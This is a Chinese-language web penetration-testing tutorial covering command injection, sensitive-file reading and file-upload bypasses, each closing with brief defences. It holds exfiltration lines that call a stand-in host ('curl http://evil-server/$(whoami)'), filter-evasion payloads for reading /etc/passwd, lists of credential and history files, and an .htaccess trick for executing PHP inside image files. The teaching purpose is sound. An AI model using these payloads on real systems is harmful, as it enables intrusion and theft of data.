# WEB安全渗透测试基础知识（八）

**3.5. 命令注入**

3.5.1. 简介
命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞
该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名/IP/掩码/网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。
------------

3.5.2. 常见危险函数

3.5.2.1. PHP
- system
- exec
- passthru
- shell_exec
- popen
- proc_open

3.5.2.2. Python

- system
- popen
- subprocess.call
- spawn

3.5.2.3. Java
- java.lang.Runtime.getRuntime().exec(command)



---
3.5.3. 常见注入方式
- 分号分割
- || && & 分割
- | 管道符
- \r\n %d0%a0 换行
- 反引号解析
- $() 替换
- 

---
3.5.4. 无回显技巧


- bash反弹shell
- DNS带外数据
- http带外

curl http://evil-server/$(whoami)

wget http://evil-server/$(whoami)
- 无带外时利用 sleep 或其他逻辑构造布尔条件
- 

---
3.5.5. 常见绕过方式

3.5.5.1. 空格绕过

- < 符号 cat<123
- \t / %09
- ${IFS} 其中{}用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串

3.5.5.2. 黑名单绕过

- a=l;b=s;$a$b
- base64 echo "bHM=" | base64 -d
- /?in/?s => /bin/ls
- 连接符 cat /etc/pass'w'd
- 未定义的初始化变量 cat$x /etc/passwd


3.5.5.3. 长度限制绕过

>wget\ 

>foo.\ 

>com 

ls -t>a 

sh a

上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行 直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如w,[之类的短命令，(使用ls /usr/bin/?查看) 如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 而在php中 , 使用 shell_exec 等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件


---
3.5.6. 常用符号

3.5.6.1. 命令分隔符

- %0a / %0d / \n / \r
- ;
- & / &&

3.5.6.2. 通配符

- 
```
* 0到无穷个任意字符
```

- ? 一个任意字符
- [  ] 一个在括号内的字符，e.g. [abcd]
- [ - ] 在编码顺序内的所有字符
- [^ ] 一个不在括号内的字符



---
3.5.7. 防御

- 不使用时禁用相应函数
- 尽量不要执行外部的应用程序或命令
- 做输入的格式检查
- 转义命令中的所有shell元字符
- shell元字符包括 #&;`,|*?~<>^()[]{}$\
- 

---
3.6. 文件读取

考虑读取可能有敏感信息的文件  


- 用户目录下的敏感文件

.bash_history

.zsh_history

.profile

.bashrc

.gitconfig

.viminfo

passwd

- 应用的配置文件

/etc/apache2/apache2.conf

/etc/nginx/nginx.conf

- 应用的日志文件

/var/log/apache2/access.log

/var/log/nginx/access.log

- 站点目录下的敏感文件

.svn/entries

.git/HEAD

WEB-INF/web.xml

.htaccess

- 特殊的备份文件

.swp

.swo

.bak

index.php~

…
- Python的Cache

__pycache__\__init__.cpython-35.pyc


---

**3.7. 文件上传**


3.7.1. 文件类型检测绕过

3.7.1.1. 更改请求绕过

有的站点仅仅在前端检测了文件类型，这种类型的检测可以直接修改网络请求绕过。同样的，有的站点在后端仅检查了HTTP Header中的信息，比如 Content-Type 等，这种检查同样可以通过修改网络请求绕过。

3.7.1.2. Magic检测绕过

有的站点使用文件头来检测文件类型，这种检查可以在Shell前加入对应的字节以绕过检查。几种常见的文件类型的头字节如下表所示

![image](https://note.youdao.com/yws/public/resource/2e5cf2591c66904f78df39f912277f6d/xmlnote/WEBRESOURCE8d63e9430f618420cd0b2103143eed70/8926)


3.7.1.3. 后缀绕过

部分服务仅根据后缀、上传时的信息或Magic Header来判断文件类型，此时可以绕过。  

php由于历史原因，部分解释器可能支持符合正则 /ph(p[2-7]?|t(ml)?)/ 的后缀，如 php / php5 / pht / phtml / shtml / pwml / phtm 等 可在禁止上传php文件时测试该类型。  

jsp引擎则可能会解析 jspx / jspf / jspa / jsw / jsv / jtml 等后缀，asp支持 asa / asax / cer / cdx / aspx / ascx / ashx / asmx / asp{80-90} 等后缀。  

除了这些绕过，其他的后缀同样可能带来问题，如 vbs / asis / sh / reg / cgi / exe / dll / com / bat / pl / cfc / cfm / ini 等。


3.7.1.4. 系统命名绕过

在Windows系统中，上传 index.php. 会重命名为 . ，可以绕过后缀检查。也可尝试 
index.php%20， index.php:1.jpg index.php::$DATA 等。在Linux系统中，可以尝试上传名为 index.php/. 或 ./aa/../index.php/. 的文件


3.7.1.5. .user.ini

在php执行的过程中，除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。.user.ini 中可以定义除了PHP_INI_SYSTEM以外的模式的选项，故可以使用 .user.ini 加上非php后缀的文件构造一个shell，比如 auto_prepend_file=01.gif 。


3.7.1.6. WAF绕过
有的waf在编写过程中考虑到性能原因，只处理一部分数据，这时可以通过加入大量垃圾数据来绕过其处理函数。  
另外，Waf和Web系统对 boundary 的处理不一致，可以使用错误的 boundary 来完成绕过。


3.7.1.7. 竞争上传绕过
有的服务器采用了先保存，再删除不合法文件的方式，在这种服务器中，可以反复上传一个会生成Web Shell的文件并尝试访问，多次之后即可获得Shell。


---
3.7.2. 攻击技巧

3.7.2.1. Apache重写GetShell

Apache可根据是否允许重定向考虑上传.htaccess  
内容为  

AddType application/x-httpd-php .png php_flag engine 1 

就可以用png或者其他后缀的文件做php脚本了

3.7.2.2. 软链接任意读文件

上传的压缩包文件会被解压的文件时，可以考虑上传含符号链接的文件 若服务器没有做好防护，可实现任意文件读取的效果

3.7.3. 防护技巧

- 使用白名单限制上传文件的类型
- 使用更严格的文件类型检查方式
- 限制Web Server对上传文件夹的解析
